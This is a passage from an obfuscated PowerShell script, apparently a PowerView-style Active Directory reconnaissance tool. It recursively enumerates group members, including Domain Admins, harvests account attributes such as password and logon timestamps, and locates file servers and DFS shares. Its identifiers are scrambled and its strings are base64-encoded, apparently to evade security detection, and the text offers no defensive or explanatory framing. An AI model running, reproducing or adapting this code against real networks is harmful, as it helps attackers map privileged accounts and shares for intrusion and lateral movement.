        ${____/==\/===\/\/\} = __/=====\_/\_/==== -Domain ${____/=\/===\/=\_/} -DomainController ${__/==\___/\_/====} -Credential $Credential -ADSpath $ADSpath -PageSize $PageSize
    }
    process {
        if (${____/==\/===\/\/\}) {
            if ($Recurse -and ${___/==\/\_/==\/=\_}) {
                if ($GroupName) {
                    ${_/=\/\/=\_/\__/\/} = _____/\/===\/=\/== -___/\_/=\_/\/=\_/\ -GroupName $GroupName -Domain ${____/=\/===\/=\_/} -DomainController ${__/==\___/\_/====} -Credential $Credential -FullData -PageSize $PageSize
                }
                elseif (${__/\/=\/\_/\/====\}) {
                    ${_/=\/\/=\_/\__/\/} = _____/\/===\/=\/== -___/\_/=\_/\/=\_/\ -__/\/=\/\_/\/====\ ${__/\/=\/\_/\/====\} -Domain ${____/=\/===\/=\_/} -DomainController ${__/==\___/\_/====} -Credential $Credential -FullData -PageSize $PageSize
                }
                else {
                    ${__/\/=\/\_/\/====\} = (__/=\_/=\___/\_/== -Domain ${____/=\/===\/=\_/} -DomainController ${__/==\___/\_/====}) + $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LQA1ADEAMgA=')))
                    ${_/=\/\/=\_/\__/\/} = _____/\/===\/=\/== -___/\_/=\_/\/=\_/\ -__/\/=\/\_/\/====\ ${__/\/=\/\_/\/====\} -Domain ${____/=\/===\/=\_/} -DomainController ${__/==\___/\_/====} -Credential $Credential -FullData -PageSize $PageSize
                }
                ${/==\_/=\_/\__/\/\} = ${_/=\/\/=\_/\__/\/}.distinguishedname
                ${_/\_/=\/==\_____/} = ${_/=\/\/=\_/\__/\/}.samaccountname
                if (${/==\_/=\_/\__/\/\}) {
                    ${____/==\/===\/\/\}.filter = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KAAmACgAcwBhAG0AQQBjAGMAbwB1AG4AdABUAHkAcABlAD0AOAAwADUAMwAwADYAMwA2ADgAKQAoAG0AZQBtAGIAZQByAG8AZgA6ADEALgAyAC4AOAA0ADAALgAxADEAMwA1ADUANgAuADEALgA0AC4AMQA5ADQAMQA6AD0AJAB7AC8APQA9AFwAXwAvAD0AXABfAC8AXABfAF8ALwBcAC8AXAB9ACkAJABGAGkAbAB0AGUAcgApAA==')))
                    ${____/==\/===\/\/\}.PropertiesToLoad.AddRange(($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZABpAHMAdABpAG4AZwB1AGkAcwBoAGUAZABOAGEAbQBlAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwBhAG0AYQBjAGMAbwB1AG4AdAB0AHkAcABlAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bABhAHMAdABsAG8AZwBvAG4A'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bABhAHMAdABsAG8AZwBvAG4AdABpAG0AZQBzAHQAYQBtAHAA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZABzAGMAbwByAGUAcAByAG8AcABhAGcAYQB0AGkAbwBuAGQAYQB0AGEA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bwBiAGoAZQBjAHQAcwBpAGQA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('dwBoAGUAbgBjAHIAZQBhAHQAZQBkAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YgBhAGQAcABhAHMAcwB3AG8AcgBkAHQAaQBtAGUA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQBjAGMAbwB1AG4AdABlAHgAcABpAHIAZQBzAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aQBzAGMAcgBpAHQAaQBjAGEAbABzAHkAcwB0AGUAbQBvAGIAagBlAGMAdAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bgBhAG0AZQA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('dQBzAG4AYwBoAGEAbgBnAGUAZAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bwBiAGoAZQBjAHQAYwBhAHQAZQBnAG8AcgB5AA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZABlAHMAYwByAGkAcAB0AGkAbwBuAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YwBvAGQAZQBwAGEAZwBlAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aQBuAHMAdABhAG4AYwBlAHQAeQBwAGUA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YwBvAHUAbgB0AHIAeQBjAG8AZABlAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZABpAHMAdABpAG4AZwB1AGkAcwBoAGUAZABuAGEAbQBlAA=='))),'cn',$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQBkAG0AaQBuAGMAbwB1AG4AdAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bABvAGcAbwBuAGgAbwB1AHIAcwA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bwBiAGoAZQBjAHQAYwBsAGEAcwBzAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bABvAGcAbwBuAGMAbwB1AG4AdAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('dQBzAG4AYwByAGUAYQB0AGUAZAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('dQBzAGUAcgBhAGMAYwBvAHUAbgB0AGMAbwBuAHQAcgBvAGwA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bwBiAGoAZQBjAHQAZwB1AGkAZAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cAByAGkAbQBhAHIAeQBnAHIAbwB1AHAAaQBkAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bABhAHMAdABsAG8AZwBvAGYAZgA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwBhAG0AYQBjAGMAbwB1AG4AdABuAGEAbQBlAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YgBhAGQAcAB3AGQAYwBvAHUAbgB0AA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('dwBoAGUAbgBjAGgAYQBuAGcAZQBkAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bQBlAG0AYgBlAHIAbwBmAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cAB3AGQAbABhAHMAdABzAGUAdAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQBkAHMAcABhAHQAaAA=')))))
                    ${/=====\_/==\/\_/\} = ${____/==\/===\/\/\}.FindAll()
                    ${_/\_/=\/==\_____/} = $GroupName
                }
                else {
                    Write-Error $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGEAYgBsAGUAIAB0AG8AIABmAGkAbgBkACAARwByAG8AdQBwAA==')))
                }
            }
            else {
                if ($GroupName) {
                    ${____/==\/===\/\/\}.filter = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KAAmACgAbwBiAGoAZQBjAHQAQwBhAHQAZQBnAG8AcgB5AD0AZwByAG8AdQBwACkAKABzAGEAbQBhAGMAYwBvAHUAbgB0AG4AYQBtAGUAPQAkAEcAcgBvAHUAcABOAGEAbQBlACkAJABGAGkAbAB0AGUAcgApAA==')))
                }
                elseif (${__/\/=\/\_/\/====\}) {
                    ${____/==\/===\/\/\}.filter = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KAAmACgAbwBiAGoAZQBjAHQAQwBhAHQAZQBnAG8AcgB5AD0AZwByAG8AdQBwACkAKABvAGIAagBlAGMAdABTAEkARAA9ACQAewBfAF8ALwBcAC8APQBcAC8AXABfAC8AXAAvAD0APQA9AD0AXAB9ACkAJABGAGkAbAB0AGUAcgApAA==')))
                }
                else {
                    ${__/\/=\/\_/\/====\} = (__/=\_/=\___/\_/== -Domain ${____/=\/===\/=\_/} -DomainController ${__/==\___/\_/====}) + $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LQA1ADEAMgA=')))
                    ${____/==\/===\/\/\}.filter = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KAAmACgAbwBiAGoAZQBjAHQAQwBhAHQAZQBnAG8AcgB5AD0AZwByAG8AdQBwACkAKABvAGIAagBlAGMAdABTAEkARAA9ACQAewBfAF8ALwBcAC8APQBcAC8AXABfAC8AXAAvAD0APQA9AD0AXAB9ACkAJABGAGkAbAB0AGUAcgApAA==')))
                }
                try {
                    ${__/\/\_/\___/=\__} = ${____/==\/===\/\/\}.FindOne()
                }
                catch {
                    ${/=====\_/==\/\_/\} = @()
                }
                ${_/\_/=\/==\_____/} = ''
                if (${__/\/\_/\___/=\__}) {
                    ${/=====\_/==\/\_/\} = ${__/\/\_/\___/=\__}.properties.item($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bQBlAG0AYgBlAHIA'))))
                    if(${/=====\_/==\/\_/\}.count -eq 0) {
                        ${/\____/\___/==\__} = $False
                        ${__/\/\/==\/\/\/\_} = 0
                        ${/=======\____/\__} = 0
                        while(!${/\____/\___/==\__}) {
                            ${/=======\____/\__} = ${__/\/\/==\/\/\/\_} + 1499
                            ${_/\_/\_/===\_/\/=}=$ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bQBlAG0AYgBlAHIAOwByAGEAbgBnAGUAPQAkAHsAXwBfAC8AXAAvAFwALwA9AD0AXAAvAFwALwBcAC8AXABfAH0ALQAkAHsALwA9AD0APQA9AD0APQA9AFwAXwBfAF8AXwAvAFwAXwBfAH0A')))
                            ${__/\/\/==\/\/\/\_} += 1500
                            ${____/==\/===\/\/\}.PropertiesToLoad.Clear()
                            [void]${____/==\/===\/\/\}.PropertiesToLoad.Add($ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JAB7AF8ALwBcAF8ALwBcAF8ALwA9AD0APQBcAF8ALwBcAC8APQB9AA=='))))
                            [void]${____/==\/===\/\/\}.PropertiesToLoad.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwBhAG0AYQBjAGMAbwB1AG4AdABuAGEAbQBlAA=='))))
                            try {
                                ${__/\/\_/\___/=\__} = ${____/==\/===\/\/\}.FindOne()
                                ${/==\/\__/======\/} = ${__/\/\_/\___/=\__}.Properties.PropertyNames -like $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bQBlAG0AYgBlAHIAOwByAGEAbgBnAGUAPQAqAA==')))
                                ${/=====\_/==\/\_/\} += ${__/\/\_/\___/=\__}.Properties.item(${/==\/\__/======\/})
                                ${_/\_/=\/==\_____/} = ${__/\/\_/\___/=\__}.properties.item($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwBhAG0AYQBjAGMAbwB1AG4AdABuAGEAbQBlAA=='))))[0]
                                if (${/=====\_/==\/\_/\}.count -eq 0) { 
                                    ${/\____/\___/==\__} = $True
                                }
                            }
                            catch [System.Management.Automation.MethodInvocationException] {
                                ${/\____/\___/==\__} = $True
                            }
                        }
                    }
                    else {
                        ${_/\_/=\/==\_____/} = ${__/\/\_/\___/=\__}.properties.item($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwBhAG0AYQBjAGMAbwB1AG4AdABuAGEAbQBlAA=='))))[0]
                        ${/=====\_/==\/\_/\} += ${__/\/\_/\___/=\__}.Properties.item(${/==\/\__/======\/})
                    }
                }
                ${____/==\/===\/\/\}.dispose()
            }
            ${/=====\_/==\/\_/\} | ? {$_} | % {
                if ($Recurse -and ${___/==\/\_/==\/=\_}) {
                    $Properties = $_.Properties
                } 
                else {
                    if(${__/==\___/\_/====}) {
                        ${__/\/\_/\___/=\__} = [adsi]$ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABEAEEAUAA6AC8ALwAkAHsAXwBfAC8APQA9AFwAXwBfAF8ALwBcAF8ALwA9AD0APQA9AH0ALwAkAF8A')))
                    }
                    else {
                        ${__/\/\_/\___/=\__} = [adsi]$ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABEAEEAUAA6AC8ALwAkAF8A')))
                    }
                    if(${__/\/\_/\___/=\__}){
                        $Properties = ${__/\/\_/\___/=\__}.Properties
                    }
                }
                if($Properties) {
                    ${/=\/=\/\/=\/=====} = @($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MgA2ADgANAAzADUANAA1ADYA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MgA2ADgANAAzADUANAA1ADcA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('NQAzADYAOAA3ADAAOQAxADIA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('NQAzADYAOAA3ADAAOQAxADMA')))) -contains $Properties.samaccounttype
                    if ($FullData) {
                        ${_/\/=====\_/==\_/} = ___/\/\/\_/\___/== -Properties $Properties
                    }
                    else {
                        ${_/\/=====\_/==\_/} = New-Object PSObject
                    }
                    ${_/\/=====\_/==\_/} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwByAG8AdQBwAEQAbwBtAGEAaQBuAA=='))) ${____/=\/===\/=\_/}
                    ${_/\/=====\_/==\_/} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwByAG8AdQBwAE4AYQBtAGUA'))) ${_/\_/=\/==\_____/}
                    if($Properties.objectSid) {
                        ${/==\/\___/=\_/\/\} = ((New-Object System.Security.Principal.SecurityIdentifier $Properties.objectSid[0],0).Value)
                    }
                    else {
                        ${/==\/\___/=\_/\/\} = $Null
                    }
                    try {
                        ${_/=====\_/\__/=\_} = $Properties.distinguishedname[0]
                        if ((${_/=====\_/\__/=\_} -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBvAHIAZQBpAGcAbgBTAGUAYwB1AHIAaQB0AHkAUAByAGkAbgBjAGkAcABhAGwAcwA=')))) -and (${_/=====\_/\__/=\_} -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMgAxAA=='))))) {
                            try {
                                if(-not ${/==\/\___/=\_/\/\}) {
                                    ${/==\/\___/=\_/\/\} = $Properties.cn[0]
                                }
                                ${_/====\/\___/=\/=} = __/\_/\_/\__/\/\/\ -__/\/=\/\_/\/====\ ${/==\/\___/=\_/\/\} | _/=\/\/==\/==\_/\/ -_/==\/\/=\/=\_/=\_ $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBUADQA'))) -___/=\/==\_/\__/== $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAG0AcABsAGUA')))
                                if(${_/====\/\___/=\/=}) {
                                    ${_/====\/\_/\/==\_} = ${_/====\/\___/=\/=}.Split('@')[1]
                                }
                                else {
                                    Write-Warning $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQByAHIAbwByACAAYwBvAG4AdgBlAHIAdABpAG4AZwAgACQAewBfAC8APQA9AD0APQA9AFwAXwAvAFwAXwBfAC8APQBcAF8AfQA=')))
                                    ${_/====\/\_/\/==\_} = $Null
                                }
                            }
                            catch {
                                Write-Warning $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQByAHIAbwByACAAYwBvAG4AdgBlAHIAdABpAG4AZwAgACQAewBfAC8APQA9AD0APQA9AFwAXwAvAFwAXwBfAC8APQBcAF8AfQA=')))
                                ${_/====\/\_/\/==\_} = $Null
                            }
                        }
                        else {
                            ${_/====\/\_/\/==\_} = ${_/=====\_/\__/=\_}.subString(${_/=====\_/\__/=\_}.IndexOf($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABDAD0A'))))) -replace $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABDAD0A'))),'' -replace ',','.'
                        }
                    }
                    catch {
                        ${_/=====\_/\__/=\_} = $Null
                        ${_/====\/\_/\/==\_} = $Null
                    }
                    if ($Properties.samaccountname) {
                        ${__/\_____/\____/=} = $Properties.samaccountname[0]
                    } 
                    else {
                        try {
                            ${__/\_____/\____/=} = __/\_/\_/\__/\/\/\ $Properties.cn[0]
                        }
                        catch {
                            ${__/\_____/\____/=} = $Properties.cn
                        }
                    }
                    ${_/\/=====\_/==\_/} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBlAG0AYgBlAHIARABvAG0AYQBpAG4A'))) ${_/====\/\_/\/==\_}
                    ${_/\/=====\_/==\_/} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBlAG0AYgBlAHIATgBhAG0AZQA='))) ${__/\_____/\____/=}
                    ${_/\/=====\_/==\_/} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBlAG0AYgBlAHIAUwBJAEQA'))) ${/==\/\___/=\_/\/\}
                    ${_/\/=====\_/==\_/} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBzAEcAcgBvAHUAcAA='))) ${/=\/=\/\/=\/=====}
                    ${_/\/=====\_/==\_/} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBlAG0AYgBlAHIARABOAA=='))) ${_/=====\_/\__/=\_}
                    ${_/\/=====\_/==\_/}.PSObject.TypeNames.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHcAZQByAFYAaQBlAHcALgBHAHIAbwB1AHAATQBlAG0AYgBlAHIA'))))
                    ${_/\/=====\_/==\_/}
                    if ($Recurse -and !${___/==\/\_/==\/=\_} -and ${/=\/=\/\/=\/=====} -and ${__/\_____/\____/=}) {
                        if($FullData) {
                            _/\____/=\__/\/\/\ -FullData -Domain ${_/====\/\_/\/==\_} -DomainController ${__/==\___/\_/====} -Credential $Credential -GroupName ${__/\_____/\____/=} -Recurse -PageSize $PageSize
                        }
                        else {
                            _/\____/=\__/\/\/\ -Domain ${_/====\/\_/\/==\_} -DomainController ${__/==\___/\_/====} -Credential $Credential -GroupName ${__/\_____/\____/=} -Recurse -PageSize $PageSize
                        }
                    }
                }
            }
        }
    }
}
function ____/\/=\/=\_/\_/= {
    [CmdletBinding()]
    param(
        [String]
        $Domain,
        [String]
        $DomainController,
        [String[]]
        ${_____/\/===\_____/},
        [ValidateRange(1,10000)] 
        [Int]
        $PageSize = 200,
        [Management.Automation.PSCredential]
        $Credential
    )
    function __/\/=\_/\/=\_/\/\ {
        param([String]$Path)
        if ($Path -and ($Path.split("\\").Count -ge 3)) {
            ${_/\/\__/\___/=\/=} = $Path.split("\\")[2]
            if(${_/\/\__/\___/=\/=} -and (${_/\/\__/\___/=\/=} -ne '')) {
                ${_/\/\__/\___/=\/=}
            }
        }
    }
    $filter = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KAAhACgAdQBzAGUAcgBBAGMAYwBvAHUAbgB0AEMAbwBuAHQAcgBvAGwAOgAxAC4AMgAuADgANAAwAC4AMQAxADMANQA1ADYALgAxAC4ANAAuADgAMAAzADoAPQAyACkAKQAoAHwAKABzAGMAcgBpAHAAdABwAGEAdABoAD0AKgApACgAaABvAG0AZQBkAGkAcgBlAGMAdABvAHIAeQA9ACoAKQAoAHAAcgBvAGYAaQBsAGUAcABhAHQAaAA9ACoAKQApAA==')))
    __/=\_/\_/\/=\___/ -Domain $Domain -DomainController $DomainController -Credential $Credential -PageSize $PageSize -Filter $filter | ? {$_} | ? {
            if(${_____/\/===\_____/}) {
                ${_____/\/===\_____/} -Match $_.samAccountName
            }
            else { $True }
        } | % {
            if($_.homedirectory) {
                __/\/=\_/\/=\_/\/\($_.homedirectory)
            }
            if($_.scriptpath) {
                __/\/=\_/\/=\_/\/\($_.scriptpath)
            }
            if($_.profilepath) {
                __/\/=\_/\/=\_/\/\($_.profilepath)
            }
        } | ? {$_} | sort -Unique
}
function __/=\_/\/\/\/\__/\ {
    [CmdletBinding()]
    param(
        [String]
        [ValidateSet("All","V1","1","V2","2")]
        ${___/\_/=\/\_/==\_/} = "All",
        [String]
        $Domain,
        [String]
        $DomainController,
        [String]
        $ADSpath,
        [ValidateRange(1,10000)] 
        [Int]
        $PageSize = 200,
        [Management.Automation.PSCredential]
        $Credential
    )
    function __/\/==\/\/\_/\_/\ {
        [CmdletBinding()]
        param(
            [byte[]]
            ${___/=\___/\_/\/\/\}
        )
        ${_/\_/===\_/==\/=\} = ${___/=\___/\_/\/\/\}
        ${/==\/\____/\_/===} = [bitconverter]::ToUInt32(${_/\_/===\_/==\/=\}[0..3],0)
        ${_/\/======\_/\/\/} = [bitconverter]::ToUInt32(${_/\_/===\_/==\/=\}[4..7],0)
        ${___/\____/====\/=\} = 8
        ${_/=====\___/\/==\} = @()
        for(${__/==\/=\_/=\/==\}=1; ${__/==\/=\_/=\/==\} -le ${_/\/======\_/\/\/}; ${__/==\/=\_/=\/==\}++){
               ${_____/\_/===\/===} = ${___/\____/====\/=\}
               ${____/\/\/\_/\_/\_} = ${___/\____/====\/=\} + 1
               ${____/====\_/\___/} = [bitconverter]::ToUInt16(${_/\_/===\_/==\/=\}[${_____/\_/===\/===}..${____/\/\/\_/\_/\_}],0)
               ${__/\_/\_/\__/\/\/} = ${____/\/\/\_/\_/\_} + 1
               ${_/\_/\/\_/==\_/==} = ${__/\_/\_/\__/\/\/} + ${____/====\_/\___/} - 1
               ${__/=\/====\__/\__} = [System.Text.Encoding]::Unicode.GetString(${_/\_/===\_/==\/=\}[${__/\_/\_/\__/\/\/}..${_/\_/\/\_/==\_/==}])
               ${/=\______/=\/\___} = ${_/\_/\/\_/==\_/==} + 1
               ${_/====\_/\_/==\/=} = ${/=\______/=\/\___} + 3
               ${_/===\/==\__/\/\_} = [bitconverter]::ToUInt32(${_/\_/===\_/==\/=\}[${/=\______/=\/\___}..${_/====\_/\_/==\/=}],0)
               ${__/\/\_/\_/\/\/==} = ${_/====\_/\_/==\/=} + 1
               ${_/\/\_/==\__/==\/} = ${__/\/\_/\_/\/\/==} + ${_/===\/==\__/\/\_} - 1
               ${__/\__/=\/=\/\/\/} = ${_/\_/===\_/==\/=\}[${__/\/\_/\_/\/\/==}..${_/\/\_/==\__/==\/}]
               switch -wildcard (${__/=\/====\__/\__}) {
                $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XABzAGkAdABlAHIAbwBvAHQA'))) {  }
                $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XABkAG8AbQBhAGkAbgByAG8AbwB0ACoA'))) {
                    ${/\____/=\__/===\_} = 0
                    ${_/===\_____/=\/==} = 15
                    ${__/\_/\____/\/===} = [byte[]]${__/\__/=\/=\/\/\/}[${/\____/=\__/===\_}..${_/===\_____/=\/==}]
                    ${__/\__/\______/\__} = New-Object Guid(,${__/\_/\____/\/===}) 
                    ${___/\___/=\_/\/=\} = ${_/===\_____/=\/==} + 1
                    ${/=\/\_/====\__/=\} = ${___/\___/=\_/\/=\} + 1
                    ${_/==\/===\/\/\__/} = [bitconverter]::ToUInt16(${__/\__/=\/=\/\/\/}[${___/\___/=\_/\/=\}..${/=\/\_/====\__/=\}],0)
                    ${_/=\__/=\_____/\/} = ${/=\/\_/====\__/=\} + 1
                    ${_/=\/\/\/\__/\___} = ${_/=\__/=\_____/\/} + ${_/==\/===\/\/\__/} - 1
                    ${__/====\/===\/===} = [System.Text.Encoding]::Unicode.GetString(${__/\__/=\/=\/\/\/}[${_/=\__/=\_____/\/}..${_/=\/\/\/\__/\___}])
                    ${_/\/==\_/==\__/=\} = ${_/=\/\/\/\__/\___} + 1
                    ${_/=\/==\/\_/\/===} = ${_/\/==\_/==\__/=\} + 1
                    ${_/\/\_/\_/===\/\/} = [bitconverter]::ToUInt16(${__/\__/=\/=\/\/\/}[${_/\/==\_/==\__/=\}..${_/=\/==\/\_/\/===}],0)
                    ${/=\____/\_/\____/} = ${_/=\/==\/\_/\/===} + 1
                    ${/=\/\/=\___/\/\/\} = ${/=\____/\_/\____/} + ${_/\/\_/\_/===\/\/} - 1
                    ${_/==\/=\__/=\__/\} = [System.Text.Encoding]::Unicode.GetString(${__/\__/=\/=\/\/\/}[${/=\____/\_/\____/}..${/=\/\/=\___/\/\/\}])
                    ${/=\/=\_/=\/\___/\} = ${/=\/\/=\___/\/\/\} + 1
                    ${_/==\___/\_/\/=\_} = ${/=\/=\_/=\/\___/\} + 3
                    ${__/\_/=\/==\__/\/\} = [bitconverter]::ToUInt32(${__/\__/=\/=\/\/\/}[${/=\/=\_/=\/\___/\}..${_/==\___/\_/\/=\_}],0)
                    ${_/\__/===\_/=\___} = ${_/==\___/\_/\/=\_} + 1
                    ${/=\_/\/\_/\/==\__} = ${_/\__/===\_/=\___} + 3
                    ${_____/\/==\__/==\} = [bitconverter]::ToUInt32(${__/\__/=\/=\/\/\/}[${_/\__/===\_/=\___}..${/=\_/\/\_/\/==\__}],0)
                    ${_____/\/=\/=\/\/=} = ${/=\_/\/\_/\/==\__} + 1
                    ${_/=\_/==\/\_/\/\_} = ${_____/\/=\/=\/\/=} + 1
                    ${___/===\/\/==\/==} = [bitconverter]::ToUInt16(${__/\__/=\/=\/\/\/}[${_____/\/=\/=\/\/=}..${_/=\_/==\/\_/\/\_}],0)
                    ${___/\/\___/======} = ${_/=\_/==\/\_/\/\_} + 1
                    ${/\_____/==\/=====} = ${___/\/\___/======} + ${___/===\/\/==\/==} - 1
                    if (${___/===\/\/==\/==} -gt 0)  {
                        ${/==\/\_/==\/==\/\} = [System.Text.Encoding]::Unicode.GetString(${__/\__/=\/=\/\/\/}[${___/\/\___/======}..${/\_____/==\/=====}])
                    }
                    ${/==\_/\/=\/=\___/} = ${/\_____/==\/=====} + 1
                    ${_/\/======\___/=\} = ${/==\_/\/=\/=\___/} + 7
                    ${/=\_/==\_/==\_/\_} = ${__/\__/=\/=\/\/\/}[${/==\_/\/=\/=\___/}..${_/\/======\___/=\}] 
                    ${_/\/==\__/===\_/=} = ${_/\/======\___/=\} + 1
                    ${__/\/===\/=\_/\/\} = ${_/\/==\__/===\_/=} + 7
                    ${_/\/=\/\/=\/=\_/\} = ${__/\__/=\/=\/\/\/}[${_/\/==\__/===\_/=}..${__/\/===\/=\_/\/\}]
                    ${_/\_/\/=\/\/=\/=\} = ${__/\/===\/=\_/\/\} + 1
                    ${/=\__/\/\__/=\/\/} = ${_/\_/\/=\/\/=\/=\} + 7
                    ${_/=\/=\/=\__/\_/\} = ${__/\__/=\/=\/\/\/}[${_/\_/\/=\/\/=\/=\}..${/=\__/\/\__/=\/\/}]
                    ${__/\____/==\/=\_/} = ${/=\__/\/\__/=\/\/}  + 1
                    ${_/\/\_/=\_/\/\/\_} = ${__/\____/==\/=\_/} + 3
                    ${___/\_/=\/\_/==\_/} = [bitconverter]::ToUInt32(${__/\__/=\/=\/\/\/}[${__/\____/==\/=\_/}..${_/\/\_/=\_/\/\/\_}],0)
                    ${__/===\_/\__/\___} = ${_/\/\_/=\_/\/\/\_} + 1
                    ${___/\/=\___/==\_/} = ${__/===\_/\__/\___} + 3
                    ${___/\/\/\_/=\/==\} = [bitconverter]::ToUInt32(${__/\__/=\/=\/\/\/}[${__/===\_/\__/\___}..${___/\/=\___/==\_/}],0)
                    ${/=\__/===\/===\__} = ${___/\/=\___/==\_/} + 1
                    ${/=\_/=\___/====\_} = ${/=\__/===\/===\__} + ${___/\/\/\_/=\/==\} - 1
                    ${/=\/=\/==\_/=\_/\} = ${__/\__/=\/=\/\/\/}[${/=\__/===\/===\__}..${/=\_/=\___/====\_}]
                    ${__/=\__/\/==\/=\/} = ${/=\_/=\___/====\_} + 1
                    ${__/\_/\__/\/\/==\} = ${__/=\__/\/==\/=\/} + 3
                    ${__/\_/==\___/===\} = [bitconverter]::ToUInt32(${__/\__/=\/=\/\/\/}[${__/=\__/\/==\/=\/}..${__/\_/\__/\/\/==\}],0)
                    ${_/\___/==\/\__/\/} = ${__/\_/\__/\/\/==\} + 1
                    ${/=\___/=\__/\_/\_} = ${_/\___/==\/\__/\/} + ${__/\_/==\___/===\} - 1
                    ${__/\/=\_/===\/\__} = ${__/\__/=\/=\/\/\/}[${_/\___/==\/\__/\/}..${/=\___/=\__/\_/\_}]
                    ${__/=\/\_/\/\_/\__} = ${/=\___/=\__/\_/\_} + 1
                    ${/==\/===\/\___/=\} = ${__/=\/\_/\/\_/\__} + 3
                    ${/==\/\___/\/=\___} = [bitconverter]::ToUInt32(${__/\__/=\/=\/\/\/}[${__/=\/\_/\/\_/\__}..${/==\/===\/\___/=\}],0)
                    ${_/\__/\/=\_/\_/=\} = 0
                    ${/======\/=\/=\__/} = ${_/\__/\/=\_/\_/=\} + 3
                    ${/==\_/====\/\_/==} = [bitconverter]::ToUInt32(${/=\/=\/==\_/=\_/\}[${_/\__/\/=\_/\_/=\}..${/======\/=\/=\__/}],0)
                    ${__/===\___/\_/===} = ${/======\/=\/=\__/} + 1
                    for(${___/\/\_/=\/\/\/\}=1; ${___/\/\_/=\/\/\/\} -le ${/==\_/====\/\_/==}; ${___/\/\_/=\/\/\/\}++){
                        ${__/===\/\_____/=\} = ${__/===\___/\_/===}
